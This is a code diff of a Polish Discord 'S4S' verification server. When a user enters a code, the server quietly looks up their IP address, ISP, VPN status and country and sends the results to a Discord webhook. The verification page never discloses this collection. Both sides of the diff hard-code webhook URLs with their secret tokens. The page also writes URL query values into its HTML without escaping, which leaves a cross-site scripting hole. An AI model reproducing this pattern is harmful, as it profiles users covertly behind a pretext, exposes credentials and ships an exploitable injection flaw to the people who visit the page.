@@ -15,10 +15,13 @@ async function getIPInfo(ip) {
     if (ip === '::1' || ip === '127.0.0.1' || ip === '::ffff:127.0.0.1') {
       cleanIp = '8.8.8.8';
     }
-    
+    if (cleanIp && cleanIp.includes('::ffff:')) {
+      cleanIp = cleanIp.split('::ffff:')[1];
+    }
+
     const response = await axios.get(`http://ip-api.com/json/${cleanIp}?fields=66846719`);
     const data = response.data;
-    
+
     if (data.status === 'success') {
       return {
         ip: data.query,
@@ -31,11 +34,11 @@ async function getIPInfo(ip) {
       };
     }
   } catch (error) {
-    console.error('Błąd IP API:', error.message);
+    console.error('❌ Błąd IP API:', error.message);
   }
-  
+
   return {
-    ip: ip,
+    ip: ip || 'Nieznane',
     isp: 'Nieznany ISP',
     vpn: 'Nieznane',
     country: 'Nieznany',
@@ -48,10 +51,16 @@ async function getIPInfo(ip) {
 // Rejestracja kodu
 app.post('/api/register-code', (req, res) => {
   const { code, userId } = req.body;
-  if (!code || !userId) return res.status(400).json({ error: 'Brak danych' });
-  
-  validCodes.set(code, { userId, expires: Date.now() + 15 * 60 * 1000 });
-  console.log(`✅ Kod ${code} dla ${userId}`);
+  if (!code || !userId) {
+    return res.status(400).json({ error: 'Brak danych' });
+  }
+
+  validCodes.set(code, {
+    userId: userId,
+    expires: Date.now() + 15 * 60 * 1000
+  });
+
+  console.log(`✅ Kod ${code} zarejestrowany dla ${userId}`);
   res.json({ success: true });
 });
 
@@ -68,9 +77,10 @@ app.get('/', (req, res) => {
         .container { background: white; border-radius: 20px; padding: 40px; max-width: 400px; width: 90%; }
         h1 { text-align: center; color: #333; }
         .code-display { background: #f0f0f0; border-radius: 10px; padding: 20px; text-align: center; font-size: 32px; font-weight: bold; margin-bottom: 20px; color: #667eea; }
-        input { width: 100%; padding: 12px; border: 2px solid #e0e0e0; border-radius: 8px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; border: 2px solid #e0e0e0; border-radius: 8px; margin-bottom: 20px; font-size: 16px; box-sizing: border-box; }
         button { width: 100%; padding: 14px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; }
-        .message { margin-top: 20px; padding: 10px; border-radius: 8px; display: none; }
+        button:hover { opacity: 0.9; }
+        .message { margin-top: 20px; padding: 10px; border-radius: 8px; display: none; text-align: center; }
         .message.success { background: #d4edda; color: #155724; display: block; }
         .message.error { background: #f8d7da; color: #721c24; display: block; }
       </style>
@@ -79,7 +89,7 @@ app.get('/', (req, res) => {
       <div class="container">
         <h1>🔐 Weryfikacja - S4S</h1>
         <div class="code-display">${code || 'Wpisz kod'}</div>
-        <input type="text" id="code" placeholder="Kod" value="${code || ''}">
+        <input type="text" id="code" placeholder="Kod weryfikacyjny" value="${code || ''}">
         <input type="hidden" id="userId" value="${userId || ''}">
         <button onclick="verify()">Zweryfikuj</button>
         <div id="message" class="message"></div>
@@ -93,11 +103,23 @@ app.get('/', (req, res) => {
           if(!userId) { msg.className = 'message error'; msg.textContent = 'Brak ID!'; return; }
           msg.className = 'message'; msg.textContent = '⏳ Weryfikacja...'; msg.style.display = 'block';
           try {
-            const res = await fetch('/api/verify', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ code, userId }) });
+            const res = await fetch('/api/verify', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ code, userId })
+            });
             const data = await res.json();
-            if(data.success) { msg.className = 'message success'; msg.textContent = '✅ Zweryfikowano!'; }
-            else { msg.className = 'message error'; msg.textContent = '❌ ' + data.message; }
-          } catch(e) { msg.className = 'message error'; msg.textContent = '❌ Błąd'; }
+            if(data.success) {
+              msg.className = 'message success';
+              msg.textContent = '✅ Zweryfikowano! Możesz wrócić na Discord.';
+            } else {
+              msg.className = 'message error';
+              msg.textContent = '❌ ' + (data.message || 'Błąd weryfikacji');
+            }
+          } catch(e) {
+            msg.className = 'message error';
+            msg.textContent = '❌ Błąd połączenia z serwerem';
+          }
         }
         window.onload = () => {
           const url = new URLSearchParams(window.location.search);
@@ -111,31 +133,37 @@ app.get('/', (req, res) => {
   `);
 });
 
-// WEBHOOK - WPISZ SWÓJ NOWY URL
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487165150451601558/7jyNH1oDB_D15dWuwf7AZALVlspxuGgugG_GhXjGMTbGsjzwtR-4yc2QO1J7fCXVwzrW';
+// WEBHOOK URL
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487170961798070352/SY4KurQZ4SruhBIVjHMUlfx7x1Q-aLXZdw8y19I4z52sP72N6vwXJPkjaXsytXYP0ozy';
 
 // Weryfikacja
 app.post('/api/verify', async (req, res) => {
   const { code, userId } = req.body;
   let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  if (clientIp && clientIp.includes(',')) clientIp = clientIp.split(',')[0];
-  
-  console.log(`🔍 Weryfikacja: ${userId}, IP: ${clientIp}`);
-  
+
+  if (clientIp && clientIp.includes(',')) {
+    clientIp = clientIp.split(',')[0].trim();
+  }
+
+  console.log(`🔍 Weryfikacja: userId=${userId}, IP=${clientIp}`);
+
+  if (!code || !userId) {
+    return res.json({ success: false, message: 'Brak kodu lub userId' });
+  }
+
   const stored = validCodes.get(code);
   if (!stored || stored.userId !== userId || stored.expires < Date.now()) {
     return res.json({ success: false, message: 'Nieprawidłowy kod!' });
   }
-  
+
   validCodes.delete(code);
+
   const ipInfo = await getIPInfo(clientIp);
-  console.log(`🌐 IP INFO: ${ipInfo.country}, ${ipInfo.isp}, ${ipInfo.ip}`);
-  
-  // WYSYŁKA WEBHOOKA
-  console.log(`📤 WYSYŁAM WEBHOOK...`);
-  
+  console.log(`🌐 Dane: ${ipInfo.country}, ${ipInfo.isp}, IP: ${ipInfo.ip}`);
+
+  // WYŚLIJ WEBHOOK
   try {
-    const embedData = {
+    const embed = {
       embeds: [{
         title: '✅ Nowa weryfikacja',
         color: 0x00ff00,
@@ -150,22 +178,21 @@ app.post('/api/verify', async (req, res) => {
         timestamp: new Date().toISOString()
       }]
     };
-    
-    const response = await axios.post(WEBHOOK_URL, embedData);
-    console.log(`✅ WEBHOOK WYSŁANY! Status: ${response.status}`);
+
+    await axios.post(WEBHOOK_URL, embed);
+    console.log('✅ WEBHOOK WYSŁANY!');
   } catch (error) {
-    console.error(`❌ WEBHOOK BŁĄD: ${error.message}`);
+    console.error('❌ BŁĄD WEBHOOKA:', error.message);
     if (error.response) {
-      console.error(`Status: ${error.response.status}`);
-      console.error(`Dane:`, error.response.data);
+      console.error('Status:', error.response.status);
+      console.error('Dane:', error.response.data);
     }
   }
-  
+
   res.json({ success: true, message: 'Zweryfikowano!' });
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`🚀 Serwer na porcie ${PORT}`);
-  console.log(`📡 Webhook URL: ${WEBHOOK_URL}`);
 });
